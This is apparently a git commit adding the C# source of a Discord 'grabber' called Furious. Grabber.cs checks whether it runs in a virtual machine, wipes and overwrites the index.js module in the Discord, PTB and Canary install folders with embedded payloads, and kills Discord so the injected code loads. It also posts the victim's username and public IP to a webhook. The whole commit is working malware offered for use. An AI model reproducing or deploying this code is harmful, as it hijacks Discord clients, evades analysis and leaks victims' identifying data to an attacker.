8c8b974ca97d44b69d4f81f1a351cb0718c999ca
EzSxurce <48179642+Jxiced@users.noreply.github.com>
2020-06-09 23:06:36 +0100

    Initial upload.

---
+++ Furious/FileManagement.cs
@@ -0,0 +1,123 @@
+﻿using System.Diagnostics;
+using System.IO;
+using System.Reflection;
+
+namespace Furious
+{
+	internal class FileManagement
+	{
+		internal static string PTBPath
+		{
+			get
+			{
+				return FileManagement._ptbpath;
+			}
+			set
+			{
+				FileManagement._ptbpath = value;
+			}
+		}
+		internal static string DiscordPath
+		{
+			get
+			{
+				return FileManagement._discordpath;
+			}
+			set
+			{
+				FileManagement._discordpath = value;
+			}
+		}
+
+		internal static string CanaryPath
+		{
+			get
+			{
+				return FileManagement._canarypath;
+			}
+			set
+			{
+				FileManagement._canarypath = value;
+			}
+		}
+
+		internal static void CleanFile(string path)
+		{
+			try
+			{
+				using (StreamWriter streamWriter = new StreamWriter(path))
+				{
+					streamWriter.Write(string.Empty);
+				}
+			}
+			catch
+			{
+			}
+		}
+
+		internal static void WriteDiscord(string path)
+		{
+			if (File.Exists(FileManagement.DiscordPath))
+			{
+				try
+				{
+					string value;
+					using (StreamReader streamReader = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream("Furious.Resources.index.txt")))
+					{
+						value = streamReader.ReadToEnd();
+					}
+					using (StreamWriter streamWriter = new StreamWriter(path))
+					{
+						streamWriter.Write(value);
+					}
+				}
+				catch
+				{
+					Debug.Write("Error writing to index.js in Discord path.");
+				}
+			}
+			if (File.Exists(FileManagement.PTBPath))
+			{
+				try
+				{
+					string value;
+					using (StreamReader streamReader2 = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream("Furious.Resources.ptb.txt")))
+					{
+						value = streamReader2.ReadToEnd();
+					}
+					using (StreamWriter streamWriter2 = new StreamWriter(path))
+					{
+						streamWriter2.Write(value);
+					}
+				}
+				catch
+				{
+					Debug.Write("Error writing to index.js in DiscordPTB path.");
+				}
+			}
+			if (File.Exists(FileManagement.CanaryPath))
+			{
+				try
+				{
+					string value;
+					using (StreamReader streamReader3 = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream("Furious.Resources.canary.txt")))
+					{
+						value = streamReader3.ReadToEnd();
+					}
+					using (StreamWriter streamWriter3 = new StreamWriter(path))
+					{
+						streamWriter3.Write(value);
+					}
+				}
+				catch
+				{
+					Debug.Write("Error writing to index.js in Discord Canary path.");
+				}
+			}
+		}
+
+		internal static string _ptbpath;
+		internal static string _discordpath;
+		internal static string _canarypath;
+	}
+}
---
+++ Furious/Grabber.cs
@@ -0,0 +1,125 @@
+﻿using System;
+using System.Diagnostics;
+using System.IO;
+using System.Management;
+using System.Net;
+using System.Net.Http;
+
+namespace Furious
+{
+    public class Grabber
+    {
+		public static bool CheckForVM()
+		{
+			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
+			{
+				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
+				{
+					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
+					{
+						string text = managementBaseObject["Manufacturer"].ToString().ToLower();
+						if ((text == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
+						{
+							return true;
+						}
+					}
+				}
+			}
+			return false;
+		}
+
+		public static void Start(bool grabIP)
+		{
+			if (Directory.Exists("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\discord"))
+			{
+				string[] discord = Directory.GetDirectories("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Discord");
+				foreach (string text in discord)
+				{
+					if (text.Contains("0."))
+					{
+						FileManagement.DiscordPath = text + "\\modules\\discord_modules\\index.js";
+						FileManagement.CleanFile(FileManagement.DiscordPath);
+						FileManagement.WriteDiscord(FileManagement.DiscordPath);
+					}
+				}
+				if (grabIP)
+				{
+					SendIP();
+				}
+			}
+			if (Directory.Exists("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\discordptb"))
+			{
+				string[] ptb = Directory.GetDirectories("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\discordptb");
+				foreach (string text2 in ptb)
+				{
+					if (text2.Contains("0."))
+					{
+						FileManagement.PTBPath = text2 + "\\modules\\discord_modules\\index.js";
+						FileManagement.CleanFile(FileManagement.PTBPath);
+						FileManagement.WriteDiscord(FileManagement.PTBPath);
+					}
+				}
+				if (grabIP)
+				{
+					SendIP();
+				}
+			}
+			if (Directory.Exists("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\discordcanary"))
+			{
+				string[] canary = Directory.GetDirectories("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\discordcanary");
+				foreach (string text3 in canary)
+				{
+					if (text3.Contains("0."))
+					{
+						FileManagement.CanaryPath = text3 + "\\modules\\discord_modules\\index.js";
+						FileManagement.CleanFile(FileManagement.CanaryPath);
+						FileManagement.WriteDiscord(FileManagement.CanaryPath);
+					}
+				}
+				if (grabIP)
+				{
+					SendIP();
+				}
+			}
+			CloseProcesses();
+		}
+
+		private static void CloseProcesses()
+		{
+			foreach (Process process in Process.GetProcesses())
+			{
+				if (process.ProcessName.ToLower().Contains("discord"))
+				{
+					process.Kill();
+				}
+			}
+		}
+
+		private static string GrabIP()
+		{
+			string result;
+			using (WebClient webClient = new WebClient())
+			{
+				result = webClient.DownloadString("https://ipv4.icanhazip.com/");
+			}
+			return result;
+		}
+
+		public static void SendIP()
+		{
+			string hook = "webhook-here";
+
+			using (HttpClient httpClient = new HttpClient())
+			{
+				try
+				{
+					httpClient.PostAsync(hook, new StringContent(Environment.UserName + ": " + Grabber.GrabIP()));
+				}
+				catch (HttpRequestException ex)
+				{
+					Debug.Write(ex.Message);
+				}
+			}
+		}
+	}
+}
